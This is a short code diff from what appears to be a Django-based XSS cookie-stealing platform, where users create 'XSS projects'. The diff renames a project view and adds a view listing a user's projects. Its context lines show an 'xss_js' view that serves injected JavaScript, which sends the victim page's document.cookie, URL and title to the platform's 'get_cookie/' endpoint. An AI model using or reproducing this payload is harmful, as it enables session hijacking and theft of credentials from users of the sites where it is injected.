@@ -23,7 +23,7 @@ def create_project(request):
 
 
 @login_required(login_url="/login/")
-def project_index(request):
+def project_detail(request):
     project_id = request.GET.get("id", "-1")
     try:
         p = XssProject.objects.get(pk=int(project_id), user=request.user)
@@ -64,3 +64,9 @@ def xss_js(request):
     x.src=''+'%s'+'?a=info&id='+%s+'&title='+document.title+'&url='+escape(document.URL)+'&cookie='+escape(document.cookie);
     """ % (BASE_URL + "get_cookie/", p.id)
     return HttpResponse(js)
+
+
+@login_required(login_url="/login/")
+def my_projects(request):
+    p = XssProject.objects.filter(user=request.user)
+    return render(request, "core/my_project.html", {"projects": p})
